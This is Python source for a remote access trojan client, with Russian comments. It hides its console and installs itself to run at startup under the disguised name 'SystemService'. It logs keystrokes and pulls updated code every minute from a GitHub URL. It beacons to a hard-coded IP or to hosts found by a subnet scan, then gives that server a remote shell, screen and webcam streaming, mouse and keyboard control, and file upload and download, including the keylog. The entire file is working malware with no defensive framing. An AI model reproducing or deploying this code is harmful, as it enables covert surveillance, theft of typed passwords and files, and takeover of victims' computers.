import socket
import subprocess
import threading
import time
import os
import sys
import struct
import platform
import urllib.request
import hashlib

import uuid

SYSTEM = platform.system()
SERVER_PORT = 8080
HANDSHAKE = b'CONNECT_v1_SECRET'  # должен совпадать с сервером
SERVER_IPS = ['26.109.130.211']
UPDATE_URL = 'https://raw.githubusercontent.com/Malomanru/intructions/refs/heads/main/client.py'

# постоянный UID хранится на диске
UID_FILE = os.path.join(os.environ.get('TEMP', '/tmp'), '.uid')
def get_uid():
    try:
        if os.path.exists(UID_FILE):
            with open(UID_FILE) as f:
                return f.read().strip()
    except Exception:
        pass
    uid = str(uuid.uuid4())
    try:
        with open(UID_FILE, 'w') as f:
            f.write(uid)
    except Exception:
        pass
    return uid

CLIENT_UID = get_uid()

# --- auto update ---
def get_file_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()
    except Exception:
        return None

def check_update():
    try:
        with urllib.request.urlopen(UPDATE_URL, timeout=10) as r:
            new_code = r.read()
        current_path = os.path.abspath(sys.argv[0])
        if hashlib.md5(new_code).hexdigest() == get_file_hash(current_path):
            return
        # На Windows нельзя перезаписать запущенный .exe — пишем рядом и запускаем bat
        if SYSTEM == 'Windows':
            tmp = current_path + '.new'
            bat = current_path + '_upd.bat'
            with open(tmp, 'wb') as f:
                f.write(new_code)
            with open(bat, 'w') as f:
                f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\n'
                        f'move /y "{tmp}" "{current_path}"\n'
                        f'start "" "{sys.executable}" "{current_path}"\n'
                        f'del "%~f0"\n')
            subprocess.Popen(['cmd', '/c', bat], creationflags=0x08000000)
        else:
            with open(current_path, 'wb') as f:
                f.write(new_code)
            subprocess.Popen([sys.executable, current_path])
        sys.exit(0)
    except Exception:
        pass

def _update_loop():
    while True:
        time.sleep(60)  # проверять каждую минуту
        check_update()

check_update()
threading.Thread(target=_update_loop, daemon=True).start()

# --- hide console (Windows only) ---
if SYSTEM == 'Windows':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# --- autostart ---
def install_autostart():
    try:
        if SYSTEM == 'Windows':
            import winreg
            path = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, f'"{path}"')
            winreg.CloseKey(key)
        else:
            path = os.path.abspath(sys.argv[0])
            autostart_dir = os.path.expanduser('~/.config/autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            desktop = f"""[Desktop Entry]
Type=Application
Name=SystemService
Exec=python3 {path}
Hidden=true
X-GNOME-Autostart-enabled=true
"""
            with open(os.path.join(autostart_dir, 'systemservice.desktop'), 'w') as f:
                f.write(desktop)
    except Exception:
        pass

install_autostart()

# --- keylogger ---
try:
    from pynput import keyboard as kb
    KEYLOG_FILE = os.path.join(os.environ.get('TEMP', '/tmp'), 'keys.txt')

    def on_press(key):
        try:
            ch = key.char
        except AttributeError:
            ch = f'[{key.name}]'
        try:
            with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
                f.write(ch)
        except Exception:
            pass

    keylogger = kb.Listener(on_press=on_press)
    keylogger.daemon = True
    keylogger.start()
except Exception:
    KEYLOG_FILE = os.path.join(os.environ.get('TEMP', '/tmp'), 'keys.txt')

# --- helpers ---
def recv_exact(conn, size):
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            raise ConnectionError("Connection lost")
        data += chunk
    return data

def send_msg(conn, data):
    conn.send(len(data).to_bytes(8, 'big') + data)

def recv_msg(conn):
    size = int.from_bytes(recv_exact(conn, 8), 'big')
    return recv_exact(conn, size)

# --- stream ---
def handle_stream(connection, mode):
    try:
        import cv2
        import numpy as np
        import mss
        import pyautogui
        pyautogui.FAILSAFE = False
    except Exception:
        send_msg(connection, b"[-] Missing libs: cv2/mss/pyautogui")
        return

    stop = threading.Event()

    def send_frames():
        try:
            if mode == 'screen':
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    while not stop.is_set():
                        try:
                            img = np.array(sct.grab(monitor))
                            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                            img = cv2.resize(img, (1280, 720))
                            _, buf = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 50])
                            data = buf.tobytes()
                            connection.send(struct.pack('>I', len(data)) + data)
                        except Exception:
                            break
            elif mode == 'camera':
                cap = cv2.VideoCapture(0)
                while not stop.is_set():
                    try:
                        ret, frame = cap.read()
                        if not ret:
                            break
                        _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                        data = buf.tobytes()
                        connection.send(struct.pack('>I', len(data)) + data)
                    except Exception:
                        break
                cap.release()
        except Exception:
            pass
        finally:
            stop.set()

    def recv_controls():
        try:
            kb_ctrl = kb.Controller()
            while not stop.is_set():
                raw = recv_msg(connection).decode().strip()
                if raw == 'stopstream':
                    stop.set()
                    break
                parts = raw.split(':')
                try:
                    if parts[0] == 'move':
                        pyautogui.moveTo(int(parts[1]), int(parts[2]))
                    elif parts[0] == 'click':
                        pyautogui.click(button=parts[1] if len(parts) > 1 else 'left')
                    elif parts[0] == 'rclick':
                        pyautogui.click(button='right')
                    elif parts[0] == 'dclick':
                        pyautogui.doubleClick()
                    elif parts[0] == 'scroll':
                        pyautogui.scroll(int(parts[1]))
                    elif parts[0] == 'key':
                        k = parts[1]
                        if k == 'enter':
                            kb_ctrl.press(kb.Key.enter)
                            kb_ctrl.release(kb.Key.enter)
                        elif k == 'backspace':
                            kb_ctrl.press(kb.Key.backspace)
                            kb_ctrl.release(kb.Key.backspace)
                        elif k == 'tab':
                            kb_ctrl.press(kb.Key.tab)
                            kb_ctrl.release(kb.Key.tab)
                        elif k == 'space':
                            kb_ctrl.press(kb.Key.space)
                            kb_ctrl.release(kb.Key.space)
                        else:
                            kb_ctrl.type(k)
                except Exception:
                    pass
        except Exception:
            stop.set()

    threading.Thread(target=send_frames, daemon=True).start()
    recv_controls()

# --- shell ---
def make_shell():
    if SYSTEM == 'Windows':
        return subprocess.Popen(
            'cmd', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, shell=False, creationflags=0x08000000)
    else:
        return subprocess.Popen(
            '/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, shell=False)

# --- lan scan ---
def get_local_subnet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return '.'.join(ip.split('.')[:3])
    except Exception:
        return None

def scan_for_server(port, timeout=0.5):
    subnet = get_local_subnet()
    if not subnet:
        return []
    found = []
    lock = threading.Lock()

    def check(ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((ip, port)) == 0:
                with lock:
                    found.append(ip)
            s.close()
        except Exception:
            pass

    threads = []
    for i in range(1, 255):
        t = threading.Thread(target=check, args=(f'{subnet}.{i}',), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return found

# --- main loop with reconnect ---
cached_ips = list(SERVER_IPS)

while True:
    connected = False
    for ip in cached_ips:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.settimeout(5)
            connection.connect((ip, SERVER_PORT))
            connection.settimeout(None)
            connected = True
            break
        except Exception:
            try:
                connection.close()
            except Exception:
                pass

    if not connected:
        # все кешированные IP не работают — сканируем заново
        scanned = scan_for_server(SERVER_PORT)
        cached_ips = list(SERVER_IPS) + [ip for ip in scanned if ip not in SERVER_IPS]
        time.sleep(10)
        continue

    try:
        hello = connection.recv(5)
        if hello != b'HELLO':
            connection.close()
            time.sleep(5)
            continue
        connection.send(HANDSHAKE)
        hostname = platform.node()
        send_msg(connection, f"{CLIENT_UID}|{hostname}|{SYSTEM}".encode())

        process = make_shell()
        output_buffer = b""
        buffer_lock = threading.Lock()

        def read_output():
            global output_buffer
            for line in process.stdout:
                with buffer_lock:
                    output_buffer += line

        threading.Thread(target=read_output, daemon=True).start()

        while True:
            command = recv_msg(connection).decode().strip()

            if command in ('screen', 'camera'):
                handle_stream(connection, command)

            elif command == "downloadkeylogger":
                if os.path.exists(KEYLOG_FILE):
                    file_size = os.path.getsize(KEYLOG_FILE)
                    connection.send(file_size.to_bytes(8, 'big'))
                    with open(KEYLOG_FILE, 'rb') as f:
                        while True:
                            chunk = f.read(65536)
                            if not chunk:
                                break
                            connection.send(chunk)
                else:
                    connection.send((0).to_bytes(8, 'big'))

            elif command.startswith("download "):
                path = command[9:].strip()
                if os.path.exists(path):
                    file_size = os.path.getsize(path)
                    connection.send(file_size.to_bytes(8, 'big'))
                    with open(path, 'rb') as f:
                        while True:
                            chunk = f.read(65536)
                            if not chunk:
                                break
                            connection.send(chunk)
                else:
                    connection.send((0).to_bytes(8, 'big'))

            elif command.startswith("upload "):
                parts = command[7:].strip().split()
                remote_path = parts[1] if len(parts) >= 2 else parts[0]
                file_size = int.from_bytes(recv_exact(connection, 8), 'big')
                try:
                    f = open(remote_path, 'wb')
                    send_msg(connection, b"ok")
                except Exception as e:
                    send_msg(connection, f"[-] Error: {e}".encode())
                    continue
                received = 0
                try:
                    while received < file_size:
                        chunk = connection.recv(min(65536, file_size - received))
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                    f.close()
                    send_msg(connection, f"[+] Saved to '{remote_path}'".encode())
                except Exception as e:
                    f.close()
                    send_msg(connection, f"[-] Error: {e}".encode())

            else:
                enc = 'cp866' if SYSTEM == 'Windows' else 'utf-8'
                try:
                    process.stdin.write((command + '\n').encode(enc))
                    process.stdin.flush()
                except Exception:
                    process = make_shell()
                    threading.Thread(target=read_output, daemon=True).start()
                time.sleep(0.5)
                with buffer_lock:
                    result = output_buffer
                    output_buffer = b""
                send_msg(connection, result if result else b"(no output)")

    except Exception:
        try:
            connection.close()
        except Exception:
            pass
        time.sleep(5)
